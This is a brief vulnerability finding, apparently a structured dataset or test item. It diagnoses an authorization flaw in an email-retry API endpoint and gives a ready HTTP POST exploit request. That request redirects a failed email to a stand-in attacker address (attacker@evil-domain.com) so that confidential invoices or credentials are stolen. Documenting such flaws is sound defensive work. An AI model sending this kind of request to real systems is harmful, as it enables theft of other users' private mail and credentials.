diagnosis: retry_failed_email allows an authenticated caller to re-queue any failed post_office Email and optionally override the recipient address without verifying that the caller initiated or is authorized to manage the original message. An attacker can hijack failed outbound emails containing confidential invoices or temporary authentication credentials by redirecting them to an attacker-controlled mailbox.
exploit_request:
POST /api/mail/emails/1402/retry/ HTTP/1.1
Host: api.saasplatform.com
Authorization: Bearer attacker_token
Content-Type: application/json

{
  "override_recipient": "attacker@evil-domain.com"
}
